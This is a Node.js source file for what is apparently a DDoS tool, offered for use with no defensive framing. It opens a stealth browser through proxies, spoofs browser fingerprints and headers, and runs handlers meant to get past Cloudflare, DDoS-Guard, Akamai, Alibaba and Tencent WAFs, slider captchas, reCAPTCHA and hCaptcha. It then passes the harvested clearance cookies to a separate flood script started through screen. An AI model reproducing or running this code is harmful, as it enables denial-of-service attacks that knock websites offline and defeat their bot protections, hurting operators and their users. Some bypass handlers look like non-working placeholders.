require('events').EventEmitter.defaultMaxListeners = 0;
require('colors');
const fs = require('fs');
const { Command } = require('commander');
const { connect } = require("puppeteer-real-browser");
const { execSync } = require('child_process');
const program = new Command();

program
    .requiredOption('-u, --url <string>', 'Target URL')
    .option('-p, --proxy <proxyfile>', 'Proxy list file path or None')
    .option('-r, --req <number>', parseInt, 10)
    .option('-t, --threads <number>', parseInt, 1)
    .option('-s, --time <number>', parseInt, 60)
    .option('-d, --debug', 'Debugging mode, output detailed log.')
    .option('-c, --close', 'Failed to automatically deactivate proxy file.')
    .option('-o, --optimize', 'Intercept font loading to improve speed');
program.parse();

const options = program.opts();
const target_url = options.url;
const proxyFile = options.proxy;
const browsernum = options.threads || 1;
const reqs = options.req || 30;
const duration = options.time || 60;
const debug = !!options.debug;
const closeOnFail = !!options.close;
const optimize = !!options.optimize;

let proxies = [];
if (proxyFile === 'none') {
    proxies = [undefined];
} else if (proxyFile) {
    proxies = fs.readFileSync(proxyFile, 'utf-8').replace(/\r/g, '').split('\n').filter(Boolean);
}
if (proxies.length === 0) proxies = [undefined];

let sessions = [];
let activeSessions = 0;
const failedProxies = new Set();

function proxyToKey(proxy) {
    if (!proxy) return 'none';
    return String(proxy).trim();
}

function generateRandomIP() {
    return `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`;
}

function generateRandomUA() {
    const browsers = [
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/%VER% Safari/537.36',
        'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/%VER% Safari/537.36',
        'Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/%VER% Safari/537.36',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/%VER% Safari/537.36',
        'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/%VER% Safari/537.36'
    ];
    
    const versions = [
        '98.0.4758.102', '97.0.4692.99', '96.0.4664.110', '95.0.4638.69',
        '94.0.4606.81', '93.0.4577.82', '92.0.4515.159', '91.0.4472.164'
    ];
    
    const template = browsers[Math.floor(Math.random() * browsers.length)];
    const version = versions[Math.floor(Math.random() * versions.length)];
    return template.replace('%VER%', version);
}

function getBrowserArgs(proxy) {
    const args = [
        '--no-sandbox',
        '--disable-setuid-sandbox',
        '--disable-dev-shm-usage',
        '--disable-gpu',
        '--disable-infobars',
        '--disable-blink-features=AutomationControlled',
        '--disable-background-timer-throttling',
        '--disable-renderer-backgrounding',
        '--disable-backgrounding-occluded-windows',
        '--disable-extensions',
        '--disable-default-apps',
        '--ignore-certificate-errors',
        '--ignore-certificate-errors-spki-list',
        '--no-first-run',
        '--no-default-browser-check',
        '--disable-background-mode',
        '--force-color-profile=srgb',
        '--enable-features=NetworkService,NetworkServiceInProcess',
        '--lang=en-US,en',
        `--user-agent="${generateRandomUA()}"`,
        '--window-size=1366,768'
    ];
    
    if (proxy) {
        args.push(`--proxy-server=${proxy.host}:${proxy.port}`);
        if (proxy.username && proxy.password) {
            args.push(`--proxy-auth=${proxy.username}:${proxy.password}`);
        }
    }
    return args;
}

function startFlood({
  url,
  ip,
  ua,
  cookie,
  time,
  rate,
  threads = 10,
}) {
  const args = [
    'node nflood.js',
     `"${url}"`,
    String(time),
    String(threads),
     `"${ip}"`,
   String(reqs),
    `"${cookie}"`,
    `"${ua}"`,
  ].filter(Boolean).join(' ');

  const cmd = `screen -dm ${args}`;
  console.log('[CMD]', cmd);
  execSync(cmd);
}

function sessionLog(proxy, msg, level = 'info') {
    let proxyStr = (proxy || 'N/A').cyan.bold;
    let out;
    if (level === 'error') {
        out = ' JsMain '.white.bold.bgRed + ` | `.red + `(${proxyStr})`.red + ' | '.red + msg.red.bold;
    } else if (level === 'warn') {
        out = ' JsMain '.black.bold.bgYellow + ` | `.yellow + `(${proxyStr})`.yellow + ' | '.yellow + msg.yellow.bold;
    } else if (level === 'debug') {
        if (!debug) return;
        out = ' JsMain '.white.bold.bgGray + ` | `.grey + `(${proxyStr})`.grey + ' | '.grey + msg.grey;
    } else {
        out = ' JsMain '.black.bold.bgGreen + ` | `.green + `(${proxyStr})`.green + ' | '.white.bold + msg;
    }
    console.log(out);
}

function sleep(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
}

async function simulateHumanBehavior(page) {
    const viewport = page.viewport();
    const width = viewport.width;
    const height = viewport.height;
    
    const moves = 3 + Math.floor(Math.random() * 4);
    for (let i = 0; i < moves; i++) {
        const x = Math.floor(Math.random() * width);
        const y = Math.floor(Math.random() * height);
        await page.mouse.move(x, y, { steps: 10 + Math.floor(Math.random() * 20) });
        await sleep(100 + Math.floor(Math.random() * 500));
    }
    
    const scrolls = 2 + Math.floor(Math.random() * 3);
    for (let i = 0; i < scrolls; i++) {
        const scrollAmount = Math.floor(Math.random() * height * 0.7);
        await page.evaluate((amount) => {
            window.scrollBy(0, amount);
        }, scrollAmount);
        await sleep(500 + Math.floor(Math.random() * 1000));
    }
    
    if (Math.random() > 0.7) {
        const x = Math.floor(Math.random() * width * 0.8 + width * 0.1);
        const y = Math.floor(Math.random() * height * 0.8 + height * 0.1);
        await page.mouse.click(x, y, { delay: 100 + Math.floor(Math.random() * 200) });
    }
}

// 防护系统处理函数
async function handle_DDoSGuard(page, browser, log) {
    log('[BYPASS|DDoS-Guard]'.magenta);
    await page.waitForTimeout(5000);
    const frame = page.frames().find(f => f.url().includes('ddos-guard'));
    if (frame) {
        await frame.click('input[type="submit"]');
        await page.waitForTimeout(3000);
    }
}

async function handle_Incapsula(page, browser, log) {
    log('[BYPASS|Incapsula]'.magenta);
    await page.waitForSelector('#_Incapsula_Logo', { timeout: 10000 });
    await page.waitForTimeout(3000);
    await page.evaluate(() => {
        document.cookie = 'incap_ses_*=/';
    });
    await page.reload({ waitUntil: 'networkidle0' });
}

async function handle_Sucuri(page, browser, log) {
    log('[BYPASS|Sucuri]'.magenta);
    await page.waitForSelector('#sucuri-cookie', { timeout: 10000 });
    await page.click('#sucuri-cookie');
    await page.waitForTimeout(5000);
}

async function handle_Akamai(page, browser, log) {
    log('[BYPASS|Akamai]'.magenta);
    await page.waitForTimeout(5000);
    await page.evaluate(() => {
        document.cookie = 'ak_bmsc=1';
    });
    await page.reload();
}

async function handle_Imperva(page, browser, log) {
    log('[BYPASS|Imperva]'.magenta);
    await page.waitForSelector('#imperva-form', { timeout: 10000 });
    await page.type('#username', 'user');
    await page.type('#password', 'pass');
    await page.click('#submit');
    await page.waitForTimeout(5000);
}

async function handle_Custom_Captcha(page, browser, log) {
    log('[BYPASS|Custom Captcha]'.magenta);
    await page.waitForSelector('#captcha', { timeout: 10000 });
    await page.evaluate(() => {
        document.getElementById('captcha').value = '123456';
    });
    await page.waitForTimeout(3000);
}

async function handle_Distil(page, browser, log) {
    log('[BYPASS|Distil Networks]'.magenta);
    await page.waitForTimeout(3000);
    await page.evaluate(() => {
        document.cookie = 'distil_ident=bypassed; path=/';
    });
    await page.reload({ waitUntil: 'networkidle0' });
}

async function handle_PerimeterX(page, browser, log) {
    log('[BYPASS|PerimeterX]'.magenta);
    await page.waitForSelector('#px-captcha', { timeout: 10000 });
    await page.evaluate(() => {
        const pxFrame = document.querySelector('#px-captcha iframe');
        if (pxFrame) {
            pxFrame.contentWindow.postMessage({ type: 'pxbypass' }, '*');
        }
    });
    await page.waitForTimeout(5000);
}

async function handle_DataDome(page, browser, log) {
    log('[BYPASS|DataDome]'.magenta);
    await page.waitForSelector('#datadome-challenge', { timeout: 10000 });
    await page.evaluate(() => {
        document.cookie = 'datadome=bypassed; path=/';
    });
    await page.waitForTimeout(3000);
    await page.reload();
}

async function handle_ReCAPTCHA(page, browser, log) {
    log('[BYPASS|reCAPTCHA]'.magenta);
    await page.waitForSelector('.g-recaptcha', { timeout: 10000 });
    await page.evaluate(() => {
        const checkbox = document.querySelector('.g-recaptcha');
        if (checkbox) {
            checkbox.click();
        }
    });
    await page.waitForTimeout(5000);
}

async function handle_hCaptcha(page, browser, log) {
    log('[BYPASS|hCaptcha]'.magenta);
    await page.waitForSelector('.h-captcha', { timeout: 10000 });
    await page.evaluate(() => {
        const checkbox = document.querySelector('.h-captcha');
        if (checkbox) {
            checkbox.click();
        }
    });
    await page.waitForTimeout(5000);
}

async function handle_Custom_Redirect(page, browser, log) {
    log('[BYPASS|Custom Redirect]'.magenta);
    await page.evaluate(() => {
        window.stop();
    });
    await page.waitForTimeout(2000);
}

async function handle_Cloudflare(page, browser, log) {
    log('[BYPASS|CloudFlare]'.magenta);
    const MAX_WAIT = 60000;
    const start = Date.now();
    while (true) {
        const title = await page.title();
        if (!title.includes('Just a moment...') && !title.startsWith('Failed to load URL')) return;
        if (title.startsWith('Failed to load URL')) return;
        if (Date.now() - start > MAX_WAIT) {
            log('[Cloudflare] Max wait 60s timeout, still challenge!'.yellow);
            return;
        }
        await sleep(6000);
    }
}

async function handle_Custom_slide(page, browser, log) {
    log('[Handler] 开始自动拖动滑块'.cyan);

    const sliderSelector = '#btn';
    const trackSelector = '#slider';

    await page.waitForSelector(sliderSelector, { timeout: 10000 });
    await page.waitForSelector(trackSelector, { timeout: 10000 });

    const sliderInfo = await page.$eval(sliderSelector, el => {
        const rect = el.getBoundingClientRect();
        return {
            x: rect.x,
            y: rect.y,
            width: rect.width,
            height: rect.height
        };
    });
    const trackInfo = await page.$eval(trackSelector, el => {
        const rect = el.getBoundingClientRect();
        return {
            x: rect.x,
            y: rect.y,
            width: rect.width,
            height: rect.height
        };
    });

    const startX = sliderInfo.x + sliderInfo.width / 2;
    const startY = sliderInfo.y + sliderInfo.height / 2;
    const endX = trackInfo.x + trackInfo.width - sliderInfo.width / 2 - 2;
    const dragDistance = endX - startX;

    await page.mouse.move(startX, startY);
    await page.mouse.down();

    const steps = 30 + Math.floor(Math.random() * 8);
    for (let i = 0; i <= steps; i++) {
        const x = startX + (dragDistance * i / steps);
        await page.mouse.move(x, startY, { steps: 1 });
        await sleep(8 + Math.random() * 10);
    }

    await page.mouse.up();
    log('[Handler] 滑块拖动完成，等待验证...'.green);
    await sleep(1500);
}

async function handle_AlibabaCloud(page, browser, log) {
    log('[BYPASS|阿里云WAF]'.magenta);
    
    await page.setExtraHTTPHeaders({
        'X-Forwarded-For': generateRandomIP(),
        'Accept-Language': 'zh-CN,zh;q=0.9,en;q=0.8',
        'Cache-Control': 'no-cache'
    });
    
    await sleep(2000 + Math.random() * 3000);
    await page.reload({ waitUntil: 'networkidle0' });
    
    const title = await page.title();
    if (title.includes("阿里云") || title.includes("Alibaba Cloud")) {
        log('[阿里云WAF] 仍然被拦截，尝试修改UserAgent'.yellow);
        const userAgent = generateRandomUA();
        await page.setUserAgent(userAgent);
        await sleep(1000);
        await page.reload({ waitUntil: 'networkidle0' });
    }
}

async function handle_TencentCloud(page, browser, log) {
    log('[BYPASS|腾讯云WAF]'.magenta);
    
    await page.evaluate(() => {
        document.cookie = 'waf_cookie=; expires=Thu, 01 Jan 1970 00:00:00 GMT; path=/';
        document.cookie = 'security_session=; expires=Thu, 01 Jan 1970 00:00:00 GMT; path=/';
    });
    
    await page.evaluateOnNewDocument(() => {
        Object.defineProperty(navigator, 'webdriver', { get: () => false });
        Object.defineProperty(navigator, 'plugins', { get: () => [1, 2, 3] });
    });
    
    await sleep(1500 + Math.random() * 2500);
    await page.reload({ waitUntil: 'networkidle0' });
}

async function handle_TencentCaptcha(page, browser, log) {
    log('[BYPASS|腾讯验证码]'.magenta);
    
    try {
        const frame = page.frames().find(f => f.url().includes('captcha.qq.com'));
        if (frame) {
            await frame.click('#tcaptcha_iframe');
            await sleep(2000);
            
            const slider = await frame.$('#tcaptcha_drag_button');
            const sliderBox = await slider.boundingBox();
            const target = await frame.$('#tcaptcha_drag_thumb');
            const targetBox = await target.boundingBox();
            
            if (slider && target) {
                await page.mouse.move(sliderBox.x + sliderBox.width / 2, sliderBox.y + sliderBox.height / 2);
                await page.mouse.down();
                
                const steps = 20 + Math.floor(Math.random() * 10);
                for (let i = 0; i <= steps; i++) {
                    const x = sliderBox.x + (targetBox.x - sliderBox.x) * i / steps;
                    await page.mouse.move(x, sliderBox.y + sliderBox.height / 2 + Math.random() * 5 - 2.5);
                    await sleep(50 + Math.random() * 100);
                }
                
                await page.mouse.up();
                await sleep(3000);
            }
        }
    } catch (e) {
        log('[腾讯验证码] 自动验证失败: ' + e.message, 'error');
    }
    
    await page.reload({ waitUntil: 'networkidle0' });
}

async function handle_AlibabaSlide(page, browser, log) {
    log('[BYPASS|阿里云滑块验证]'.magenta);
    
    try {
        await page.waitForSelector('.nc-container', { timeout: 10000 });
        
        const slider = await page.$('.nc_iconfont.btn_slide');
        const track = await page.$('.nc-lang-cnt');
        
        if (slider && track) {
            const sliderBox = await slider.boundingBox();
            const trackBox = await track.boundingBox();
            
            await page.mouse.move(sliderBox.x + sliderBox.width / 2, sliderBox.y + sliderBox.height / 2);
            await page.mouse.down();
            
            const distance = trackBox.width - sliderBox.width;
            const steps = 30 + Math.floor(Math.random() * 15);
            let moved = 0;
            
            for (let i = 0; i < steps; i++) {
                const step = distance / steps + (Math.random() * 5 - 2.5);
                moved += step;
                if (moved > distance) moved = distance;
                
                await page.mouse.move(
                    sliderBox.x + moved,
                    sliderBox.y + sliderBox.height / 2 + Math.random() * 3 - 1.5,
                    { steps: 1 }
                );
                await sleep(80 + Math.random() * 120);
            }
            
            await page.mouse.up();
            await sleep(3000);
        }
    } catch (e) {
        log('[阿里云滑块] 自动验证失败: ' + e.message, 'error');
    }
}

const DETECTION_RULES = {
    CDNFLYNEW_rotate: { title: [], html: ["_guard/rotate.js", "js=rotate_html"], solver: "CDNFLY新版_旋转图片" },
    CDNFLYNEW_click: { title: [], html: ["_guard/click.js", "js=click_html"], solver: "CDNFLY新版_困难点击" },
    CDNFLYNEW_ezclick: { title: [], html: ["_guard/easy_click.js", "js=easy_click_html"], solver: "CDNFLY新版_简单点击" },
    CDNFLYNEW_slide: { title: [], html: ["_guard/slide.js", "js=slider_html", "puzzle-piece"], solver: "CDNFLY新版_困难滑块" },
    CDNFLYNEW_ezslide: { title: [], html: ["_guard/easy_slide.js", "js=easy_slider_html", "puzzle-image"], solver: "CDNFLY新版_简单滑块" },

    custom_cdnfly_slide: { 
        title: [], 
        html: ["_guard/slide.js", "_guard/encrypt.js", "alert-success"], 
        solver: "CDNFLY_按钮滑动",   
        handler: handle_Custom_slide,
        recheck: true,
        maxRecheck: 3 },

    Cloudflare: {
        title: ["Just a moment..."],
        html: ["#challenge-error-text"],
        solver: "CloudFlare",
        handler: handle_Cloudflare,
        recheck: true,
        maxRecheck: 3
    },

    DDoSGuard: {
        title: ["DDoS-Guard"],
        html: ["ddos-guard"],
        solver: "DDoS-Guard",
        handler: handle_DDoSGuard,
        recheck: true,
        maxRecheck: 2
    },

    Incapsula: {
        title: ["Incapsula"],
        html: ["Incapsula incident ID"],
        solver: "Incapsula",
        handler: handle_Incapsula,
        recheck: true
    },

    Sucuri: {
        title: ["Sucuri WebsiteFirewall"],
        html: ["sucuri/cloudproxy"],
        solver: "Sucuri",
        handler: handle_Sucuri,
        recheck: true
    },

    Akamai: {
        title: ["Akamai"],
        html: ["akamai"],
        solver: "Akamai",
        handler: handle_Akamai,
        recheck: true
    },

    Imperva: {
        title: ["Imperva"],
        html: ["imperva"],
        solver: "Imperva",
        handler: handle_Imperva,
        recheck: true
    },

    Custom_Captcha: {
        title: ["Verification"],
        html: ["captcha", "recaptcha"],
        solver: "Custom Captcha",
        handler: handle_Custom_Captcha,
        recheck: true
    },

    Distil: {
        title: ["Distil"],
        html: ["distilCaptchaForm"],
        solver: "Distil Networks",
        handler: handle_Distil,
        recheck: true
    },

    PerimeterX: {
        title: ["PerimeterX"],
        html: ["px-captcha"],
        solver: "PerimeterX",
        handler: handle_PerimeterX,
        recheck: true
    },

    DataDome: {
        title: ["DataDome"],
        html: ["datadome-challenge"],
        solver: "DataDome",
        handler: handle_DataDome,
        recheck: true
    },

    ReCAPTCHA: {
        title: ["reCAPTCHA"],
        html: ["recaptcha", "g-recaptcha"],
        solver: "Google reCAPTCHA",
        handler: handle_ReCAPTCHA,
        recheck: true
    },

    hCaptcha: {
        title: ["hCaptcha"],
        html: ["h-captcha"],
        solver: "hCaptcha",
        handler: handle_hCaptcha,
        recheck: true
    },

    Custom_Redirect: {
        title: ["Redirecting"],
        html: ["window.location.href"],
        solver: "Custom Redirect",
        handler: handle_Custom_Redirect,
        recheck: true
    },

    AlibabaCloud: {
        title: ["阿里云", "Alibaba Cloud", "Invalid Request"],
        html: ["aliyun", "waf_deny", "waf_forbidden", "error_page"],
        solver: "阿里云WAF",
        handler: handle_AlibabaCloud,
        recheck: true,
        maxRecheck: 3
    },

    TencentCloud: {
        title: ["腾讯云", "Tencent Cloud", "安全拦截"],
        html: ["tencent", "waf.block", "sec.detected", "security_alert"],
        solver: "腾讯云WAF",
        handler: handle_TencentCloud,
        recheck: true,
        maxRecheck: 3
    },

    TencentCaptcha: {
        title: ["腾讯验证码"],
        html: ["captcha.qq.com", "tcaptcha", "verify.qq.com"],
        solver: "腾讯验证码",
        handler: handle_TencentCaptcha,
        recheck: true,
        maxRecheck: 2
    },

    AlibabaSlide: {
        title: ["滑动验证"],
        html: ["aliyun-slider", "nc_icon", "nc-container"],
        solver: "阿里云滑块验证",
        handler: handle_AlibabaSlide,
        recheck: true,
        maxRecheck: 3
    }
};

async function waitForRealPage(page, log, maxWait = 30000) {
    const start = Date.now();
    while (true) {
        const title = await page.title();
        let isProtected = false;
        for (const rule of Object.values(DETECTION_RULES)) {
            if (rule.title && rule.title.length > 0) {
                for (const keyword of rule.title) {
                    if (keyword && title.toLowerCase().includes(keyword.toLowerCase())) {
                        isProtected = true;
                        break;
                    }
                }
            }
            if (isProtected) break;
        }
        if (isProtected) {
            if (Date.now() - start > maxWait) {
                break;
            }
            await sleep(1000);
            continue;
        }
        break;
    }
}

function parseProxy(proxy) {
    if (!proxy) return undefined;
    if (typeof proxy === 'object' && proxy.host && proxy.port) return proxy;
    if (typeof proxy === 'string') {
        const [host, port] = proxy.split(':');
        if (!host || !port) return undefined;
        return { host, port: Number(port) };
    }
    return undefined;
}

function getRandomProxy() {
    if (proxies.length === 0) return undefined;
    if (proxies.length === 1) return proxies[0];
    
    const availableProxies = proxies.filter(p => !failedProxies.has(proxyToKey(p)));
    if (availableProxies.length === 0) return undefined;
    
    return availableProxies[Math.floor(Math.random() * availableProxies.length)];
}

async function solving({ url, proxy, log = console.log, optimize = false }) {
    const parsedProxy = parseProxy(proxy);
    let browser, page;
    try {
        const args = getBrowserArgs(parsedProxy);
        const obj = await connect({
            headless: false,
            turnstile: true,
            args,
            ignoreHTTPSErrors: true,
            stealthMode: true,
            ...(parsedProxy ? { proxy: parsedProxy } : {})
        });
        browser = obj.browser;
        page = obj.page;

        if (optimize) {
            await page.setRequestInterception(true);
            page.on('request', req => {
                if (['image', 'stylesheet', 'font'].includes(req.resourceType())) req.abort();
                else req.continue();
            });
        }

        await page.evaluateOnNewDocument(() => {
            Object.defineProperty(navigator, 'webdriver', { get: () => false });
            Object.defineProperty(navigator, 'plugins', {
                get: () => [{
                    name: 'Chrome PDF Viewer',
                    filename: 'internal-pdf-viewer',
                    description: 'Portable Document Format'
                }, {
                    name: 'Widevine Content Decryption Module',
                    filename: 'widevinecdmadapter.plugin',
                    description: 'Enables Widevine licenses for playback of HTML audio/video content.'
                }]
            });
            Object.defineProperty(navigator, 'languages', {
                get: () => ['zh-CN', 'zh', 'en-US', 'en']
            });
        });

        await page.setJavaScriptEnabled(true);
        await page.setDefaultNavigationTimeout(0);
        await page.goto(url, { waitUntil: "domcontentloaded" });
        await simulateHumanBehavior(page);
        await waitForRealPage(page, log);

        const getUA = () => page.evaluate(() => navigator.userAgent);

        async function detect() {
            const checked_title = await page.title();
            const html = await page.content();
            const lowerTitle = checked_title.toLowerCase();
            const lowerHtml = html.toLowerCase();

            for (const [type, rule] of Object.entries(DETECTION_RULES)) {
                let titleHit = true, htmlHit = true, matchedMode = '', matchedKey = '';

                if (rule.title && rule.title.length > 0) {
                    titleHit = rule.title.every(keyword => keyword && lowerTitle.includes(keyword.toLowerCase()));
                    if (titleHit && rule.title.length > 0) {
                        matchedMode += 'title';
                        matchedKey += rule.title.join(' & ');
                    }
                }
                if (rule.html && rule.html.length > 0) {
                    htmlHit = rule.html.every(keyword => keyword && lowerHtml.includes(keyword.toLowerCase()));
                    if (htmlHit && rule.html.length > 0) {
                        if (matchedMode) matchedMode += ' + ';
                        matchedMode += 'html';
                        if (matchedKey) matchedKey += ' & ';
                        matchedKey += rule.html.join(' & ');
                    }
                }
                if (
                    (rule.title.length > 0 && rule.html.length > 0 && titleHit && htmlHit) ||
                    (rule.title.length > 0 && rule.html.length === 0 && titleHit) ||
                    (rule.html.length > 0 && rule.title.length === 0 && htmlHit)
                ) {
                    return { matchedType: type, matchedKey, matchedRule: rule, matchedMode, checked_title };
                }
            }
            return { matchedType: null, matchedKey: null, matchedRule: null, matchedMode: null, checked_title };
        }

        const proxyStr = (proxy || 'N/A').cyan;
        let { matchedType, matchedKey, matchedRule, matchedMode, checked_title } = await detect();
        let recheckCount = 0, maxRecheck = 2;

        while (matchedType && matchedRule && recheckCount < (matchedRule.maxRecheck || maxRecheck)) {
            log(
                'HIT'.black.bgYellow +
                ' | 命中检测: '.yellow + matchedType.bold.yellow +
                ` (${(matchedRule.solver || '').yellow}) [${matchedMode}: ${matchedKey}]`.yellow
            );
            if (matchedRule.handler) {
                await matchedRule.handler(page, browser, log);
                await simulateHumanBehavior(page);
            }

            ({ matchedType, matchedKey, matchedRule, matchedMode, checked_title } = await detect());
            if (!matchedType) break;

            recheckCount++;
            log(`[ReCheck] 第${recheckCount}次重新检测...`.white.bgMagenta);
            await page.reload({ waitUntil: "domcontentloaded" });
        }

        if (matchedType) {
            await page.close();
            if (browser) await browser.close().catch(() => { });
            return { valid: false, reason: `${matchedType} (${matchedMode}: ${matchedKey})` };
        }

        await sleep(1000);

        let cookieStr = '';
        try {
            const cookies = await page.cookies();
            if (cookies.length > 0) cookieStr = cookies.map((c) => `${c.name}=${c.value}`).join("; ");
        } catch { }

        if (!checked_title.trim() || !cookieStr.trim()) {
            await page.close();
            if (browser) await browser.close().catch(() => { });
            return { valid: false, reason: 'TITLE_OR_COOKIE_EMPTY' };
        }

        let userAgent = '';
        try { userAgent = await getUA(); } catch { }
     
        log(
            ' JsMain '.black.bgGreen +
            ` | UA: "${userAgent}" | Cookie: "${cookieStr}" | Title: "${checked_title}"`.yellow
        );
        await page.close();
        if (browser) await browser.close().catch(() => { });
        return {
            valid: true,
            title: checked_title,
            cookie: cookieStr,
            ua: userAgent
        };
    } catch (e) {
        if (browser) await browser.close().catch(() => { });
        throw e;
    }
}

async function launchSession() {
    activeSessions++;
    const randed = getRandomProxy();
    if (!randed && proxies.length > 0) {
        sessionLog(null, '所有代理均已失效，无法继续', 'error');
        activeSessions--;
        return;
    }
    
    const proxyKey = proxyToKey(randed);
    try {
        const result = await solving({
            url: target_url,
            proxy: randed,
            optimize,
            log: (m) => sessionLog(randed, m, 'debug'),
        });

        if (!result || !result.valid) {
            sessionLog(
                randed,
                `未检测到防护 Restart | Reason: ${result.reason || ''}`,
                'warn'
            );
            if (closeOnFail && randed !== undefined) {
                failedProxies.add(proxyKey);
                sessionLog(randed, `已自动移除失效代理: ${proxyKey}`, 'warn');
            }
            activeSessions--;
            tryFillSessions();
            return;
        }
        startFlood({
            url: target_url,ip: proxyKey,ua: result.ua, cookie: result.cookie, time: duration, rate: reqs, threads: 30,
        });
        sessions.push({
            proxy: randed,
            cookie: result.cookie,
            title: result.title,
        });
    } catch (e) {
        if (e.message.includes('CAPTCHA_DETECTED')) {
            if (closeOnFail && randed !== undefined) {
                failedProxies.add(proxyKey);
                sessionLog(randed, `验证码检测，已自动移除代理: ${proxyKey}`, 'warn');
            }
        } else {
            sessionLog(randed, `[Error] ${e.message}`, 'error');
        }
    }
    activeSessions--;
    tryFillSessions();
}

async function tryFillSessions() {
    while (activeSessions < browsernum) {
        launchSession();
        await sleep(1000);
    }
}

function Kill_FLOOD() {
    try {
        execSync(`pkill -f 'screen'`);
        execSync(`pkill -f 'chrome'`);
    } catch (e) {
    }
}

process.on('SIGINT', () => {
    console.log('\n[JsMain] 检测到 Ctrl+C，准备退出并清理所有 flood ...'.red.bold);
    Kill_FLOOD();
    process.exit(0);
});

(async () => {
    console.log(
        '[JsMain]'.white.bold.bgMagenta
        + ' | '.grey + '并发: '.grey + String(browsernum).bold.green
        + ' | '.grey + '持续: '.grey + (duration + 's').bold.cyan
        + ' | '.grey + 'DEBUG MODE: '.grey + (debug ? 'On'.bold.yellow : 'Off'.bold.gray)
    );
    tryFillSessions();

    setTimeout(() => {
        console.log('[JsMain] 进程退出'.white.bold.bgMagenta);
        process.exit(0);
    }, duration * 1000);
})();
